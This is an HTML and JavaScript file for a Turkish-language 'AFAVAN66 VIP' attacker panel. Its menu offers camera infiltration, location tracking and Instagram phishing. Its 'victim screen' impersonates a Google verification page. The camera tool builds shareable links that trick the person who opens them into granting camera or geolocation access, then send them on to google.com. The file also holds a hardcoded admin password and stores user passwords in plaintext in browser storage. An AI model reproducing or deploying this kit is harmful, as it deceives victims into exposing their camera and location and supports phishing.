<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AFAVAN66 - VIP Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #000; --accent: #00d4ff; --border: #111; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
        body { background: var(--bg); color: white; overflow-x: hidden; }

        /* KURBAN EKRANI (GOOGLE MASK) */
        #victim-screen { position: fixed; inset: 0; background: #fff; color: #000; z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
        .g-btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }

        /* AUTH */
        #auth-screen { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .auth-card { width: 90%; max-width: 380px; padding: 30px; border: 1px solid var(--border); border-radius: 10px; background: #050505; }
        input { width: 100%; background: #000; border: 1px solid #222; padding: 15px; color: white; margin-bottom: 10px; border-radius: 5px; outline: none; }
        .btn { width: 100%; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }

        /* PANEL */
        header { position: fixed; top: 0; width: 100%; height: 60px; background: #050505; display: flex; align-items: center; padding: 0 15px; border-bottom: 1px solid var(--border); }
        #sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #050505; border-right: 1px solid var(--border); transition: 0.3s; z-index: 1001; }
        #sidebar.active { left: 0; }
        .side-link { padding: 15px 20px; color: #fff; cursor: pointer; display: block; text-decoration: none; font-size: 14px; }
        .side-link:hover { background: rgba(0, 212, 255, 0.1); color: var(--accent); }

        main { padding: 80px 20px; max-width: 600px; margin: 0 auto; display: none; }
        .card { background: #080808; border: 1px solid var(--border); padding: 20px; border-radius: 10px; margin-bottom: 20px; border-top: 2px solid var(--accent); }
        .link-box { background: #000; border: 1px dashed #333; padding: 12px; font-size: 10px; color: var(--accent); word-break: break-all; margin: 15px 0; border-radius: 5px; }
        
        #overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 1000; }
        #overlay.active { display: block; }
    </style>
</head>
<body>

    <div id="victim-screen">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="120">
        <h3 style="margin-top:20px; font-family:arial;">Kimlik Doğrulaması Gerekli</h3>
        <p style="color:#555; font-size:14px; font-family:arial; padding:0 20px;">Lütfen tarayıcı üzerinden devam ederek cihazınızı doğrulayın.</p>
        <button class="g-btn" onclick="takeAction()">DOĞRULA VE GİRİŞ YAP</button>
    </div>

    <div id="auth-screen">
        <div class="auth-card">
            <h2 style="color:var(--accent); text-align:center; margin-bottom:20px;">AFAVAN66 VIP</h2>
            <div style="display:flex; margin-bottom:15px; border-bottom:1px solid #111;">
                <div id="t1" style="flex:1; text-align:center; padding:10px; cursor:pointer; color:var(--accent);" onclick="setMode('login')">GİRİŞ</div>
                <div id="t2" style="flex:1; text-align:center; padding:10px; cursor:pointer; color:#444;" onclick="setMode('reg')">KAYIT</div>
            </div>
            <input type="email" id="email" placeholder="E-posta">
            <input type="password" id="pass" placeholder="Şifre">
            <button class="btn" style="background:var(--accent); color:#000;" onclick="handleAuth()">SİSTEME GİR</button>
        </div>
    </div>

    <header>
        <button onclick="toggle()" style="background:none; border:none; color:var(--accent); font-size:24px; cursor:pointer;">☰</button>
        <span style="margin-left:15px; font-weight:bold;">AFAVAN66 <span style="color:var(--accent)">VIP</span></span>
    </header>

    <div id="overlay" onclick="toggle()"></div>
    <nav id="sidebar">
        <div style="padding:20px; font-size:10px; color:#333;">SIZMA MENÜSÜ</div>
        <div class="side-link" onclick="show('cam')">📷 Kamera Sızma</div>
        <div class="side-link" onclick="show('loc')">📍 Konum Takibi</div>
        <div class="side-link" onclick="show('ig')">📸 Instagram Phish</div>
        <div style="color:red; margin-top:50px; padding:20px; cursor:pointer;" onclick="logout()">🔴 ÇIKIŞ YAP</div>
    </nav>

    <main id="main">
        <div id="tool-cam" class="tool">
            <div class="card">
                <h3>Kamera Sızma</h3>
                <input type="text" id="slug-cam" placeholder="Link sonuna ne yazılsın?" oninput="update()">
                <div class="link-box" id="link-cam"></div>
                <button class="btn" style="background:var(--accent); color:#000;" onclick="copy('link-cam')">LİNKİ KOPYALA</button>
            </div>
        </div>
    </main>

    <script>
        let mode = 'login';
        let db = JSON.parse(localStorage.getItem('afa_db')) || {};

        window.onload = () => {
            const p = new URLSearchParams(window.location.search);
            if(p.has('secure-gate')) {
                document.getElementById('victim-screen').style.display = 'flex';
                document.getElementById('auth-screen').style.display = 'none';
            } else {
                const s = localStorage.getItem('afa_session');
                if(s) start(JSON.parse(s));
            }
        };

        function setMode(m) {
            mode = m;
            document.getElementById('t1').style.color = m === 'login' ? 'var(--accent)' : '#444';
            document.getElementById('t2').style.color = m === 'reg' ? 'var(--accent)' : '#444';
        }

        function handleAuth() {
            const e = document.getElementById('email').value, p = document.getElementById('pass').value;
            if(e === "afavan66" && p === "Efecan1903") return start({e, id:'ROOT'});
            if(mode === 'reg') {
                db[e] = {p, id: Math.random().toString(36).substring(7)};
                localStorage.setItem('afa_db', JSON.stringify(db));
                alert("Kayıt başarılı!");
            } else {
                if(db[e] && db[e].p === p) start({e, id: db[e].id}); else alert("Hatalı!");
            }
        }

        function start(s) {
            localStorage.setItem('afa_session', JSON.stringify(s));
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('main').style.display = 'block';
            update();
        }

        function update() {
            const s = JSON.parse(localStorage.getItem('afa_session'));
            const b = window.location.origin + window.location.pathname;
            const slug = document.getElementById('slug-cam').value || 'secure-view';
            document.getElementById('link-cam').innerText = `${b}?secure-gate=cam-${s.id}-${slug}`;
        }

        async function takeAction() {
            try {
                const p = new URLSearchParams(window.location.search);
                if(p.get('secure-gate').includes('cam')) await navigator.mediaDevices.getUserMedia({video:true});
                if(p.get('secure-gate').includes('loc')) await new Promise(r => navigator.geolocation.getCurrentPosition(r, r));
            } catch(e) {}
            window.location.href = "https://www.google.com";
        }

        function toggle() { document.getElementById('sidebar').classList.toggle('active'); document.getElementById('overlay').classList.toggle('active'); }
        function copy(id) { navigator.clipboard.writeText(document.getElementById(id).innerText); alert("Kopyalandı!"); }
        function logout() { localStorage.removeItem('afa_session'); location.reload(); }
    </script>
</body>
</html>
